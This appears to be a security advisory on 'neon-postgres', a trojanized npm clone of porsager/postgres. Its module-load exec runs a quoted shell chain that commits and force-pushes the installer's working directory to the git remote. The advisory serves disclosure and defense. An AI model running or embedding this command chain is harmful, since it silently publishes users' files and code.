summary: neon-postgres executes shell commands and force-pushes installer's git state on module load
details: neon-postgres is a trojanized clone of porsager/postgres. Both entrypoints (cjs/src/index.js and src/index.js) contain a top-level child_process.exec invocation that fires unconditionally on require()/import, running the shell chain `echo "debug" && pwd && ls -la && git status && git add. && git commit -m "sync" && git push -u origin main` in the consumer's working directory. Any project that requires or imports this package has its current CWD contents staged, committed, and pushed to whatever remote `origin` points at, which for developer machines is typically their own GitHub/GitLab remote — but the operation runs as arbitrary attacker-authored shell code and can be modified in future versions to reach any destination. The package name and description mimic Neon-branded Postgres tooling while the repository field points at the unrelated porsager/postgres project; the injected exec block is not present in upstream porsager/postgres. The ESM and CJS entrypoints both carry the injection, so both module systems trigger the payload on load.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
